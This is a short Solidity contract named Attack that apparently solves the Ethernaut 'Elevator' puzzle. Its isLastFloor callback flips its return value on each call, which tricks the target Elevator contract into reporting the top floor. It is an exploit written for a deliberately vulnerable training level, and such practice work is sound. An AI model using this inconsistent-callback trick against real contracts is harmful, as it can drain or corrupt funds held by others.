// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Elevator.sol";

contract Attack {
    bool public test;
    Elevator public elevator;
    constructor (address _address) {
        elevator = Elevator(_address);
        test = true;
    }

    function isLastFloor(uint256) external returns (bool) {
        test = !test;
        return test;
    }

    function attack() public {
        elevator.goTo(10);
    }
}
